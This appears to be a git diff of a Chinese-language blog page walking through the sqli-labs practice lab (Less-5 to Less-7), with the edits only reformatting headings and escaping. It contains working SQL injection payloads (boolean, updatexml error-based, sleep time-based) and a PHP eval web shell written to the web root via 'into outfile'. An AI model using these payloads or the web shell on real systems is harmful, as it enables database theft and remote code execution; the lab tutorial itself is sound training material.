@@ -576,7 +576,7 @@ ord(mid((select  username from security.users order by id limit 0,1),1,1))=68--+
 <p>具体方法以后再补,先跳过</p>
 </li>
 </ul>
-<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h3><p>报错注入的手段很多,这里讲一个我习惯用的(博客后面报错注入的时候基本也用这个):</p>
+<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h3><p>(1)报错注入的手段很多,这里讲一个我习惯用的(博客后面报错注入的时候基本也用这个):</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># 语法：</span>
 <span class="token keyword">select</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>sql语句<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
 
@@ -603,9 +603,9 @@ http:<span class="token comment" spellcheck="true">//127.0.0.1/sqli-labs/Less-5/
 </code></pre>
 <h3 id="4-延时注入"><a href="#4-延时注入" class="headerlink" title="4.延时注入"></a>4.延时注入</h3><p>代码含义:以猜数据库名的第一个字符为例子,如果猜错了ascii码额值，就执行sleep(5),网页要等待5s才刷新,否则立刻会刷新</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p><a href="https://imgchr.com/i/Dlglr9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dlglr9.png" alt="结果图"></a></p>
-<p>二.less6<br>同less5 ,只不过变成双引号闭合,把’改成”即可,其他地方相同</p>
+<h2 id="二-less6"><a href="#二-less6" class="headerlink" title="二.less6"></a>二.less6</h2><p>同less5 ,只不过变成双引号闭合,把’改成”即可,其他地方相同</p>
 <h2 id="三-less7"><a href="#三-less7" class="headerlink" title="三.less7"></a>三.less7</h2><ul>
-<li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>
+<li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?&gt;</span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>
 网页提示用out file来解决<br><a href="https://imgchr.com/i/Dl2BSU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl2BSU.png" alt=""></a></li>
 <li>less7代码:  <pre><code>http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,'&lt;?php @eval($_POST["crow"]); ?&gt;' into outfile  'E:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php' --+</code></pre>注意点  </li>
 <li>本关要构造’))才能形成正确闭合</li>
